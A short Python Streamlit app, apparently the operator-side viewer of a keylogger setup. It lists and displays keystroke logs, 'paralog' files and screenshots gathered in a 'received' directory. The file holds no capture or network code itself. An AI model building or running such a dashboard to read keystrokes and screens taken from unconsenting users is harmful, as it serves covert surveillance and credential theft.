import streamlit as st
import os

LOG_DIR = "/home/ubuntu/received"

def list_logs(prefix, extension=None):
    return sorted([
        f for f in os.listdir(LOG_DIR)
        if f.startswith(prefix) and (extension is None or f.endswith(extension))
    ], reverse=True)

def read_log(filename):
    try:
        with open(os.path.join(LOG_DIR, filename), "r") as f:
            return f.read()
    except Exception as e:
        return f"❌ Error: {e}"

st.set_page_config(page_title="Keylogger Logs Dashboard", layout="wide")
st.title("📋 Keylogger Logs Dashboard")

# Add refresh button
if st.button("🔄 Refresh Logs"):
    st.rerun()
    # Create tabs: one for keylogs + paralogs, one for screenshots
tab_logs, tab_screenshots = st.tabs(["📝 Keylogs & Paralogs", "🖼️ Screenshots"])

with tab_logs:
    col1, col2 = st.columns(2)

    with col1:
        st.header("⌨️ Keylog Files")
        keylogs = list_logs("keylog_", extension=".txt")
        if keylogs:
            selected_keylog = st.selectbox("Select a keylog file", keylogs, key="keylog_select")
            keylog_content = read_log(selected_keylog)
            st.text_area("Keylog Content", keylog_content, height=400)
        else:
            st.warning("No keylog files found.")
    with col2:
        st.header("📝 Paralog Files")
        paralogs = list_logs("paralog_", extension=".txt")
        if paralogs:
            selected_paralog = st.selectbox("Select a paralog file", paralogs, key="paralog_select")
            paralog_content = read_log(selected_paralog)
            st.text_area("Paralog Content", paralog_content, height=400)
        else:
            st.warning("No paralog files found.")

with tab_screenshots:
    st.header("🖼️ Screenshot Files")
    screenshots = list_logs("screenshot_", extension=".png")
    if screenshots:
        selected_screenshot = st.selectbox("Select a screenshot", screenshots, key="screenshot_select")
        image_path = os.path.join(LOG_DIR, selected_screenshot)
        st.image(image_path, caption=selected_screenshot, use_container_width=True)
    else:
        st.warning("No screenshot files found.")